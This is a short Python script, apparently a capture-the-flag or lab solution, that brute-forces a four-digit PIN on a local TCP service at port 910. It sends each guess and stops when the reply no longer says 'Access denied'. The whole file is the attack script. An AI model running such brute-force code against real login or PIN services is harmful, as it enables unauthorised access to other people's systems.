#!/usr/bin/env python3

import socket

HOST = '127.0.0.1'
PORT = 910

for i in range(1,9999):
    i = f"{i:04}"
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        print(f"Trying {i}")
        s.recv(4096)
        s.send(f"{i}\n".encode())
        resp = s.recv(4096).decode()
        print(resp)
        if not "Access denied" in resp:
            print(f"\rFound pin: {i}")
            break
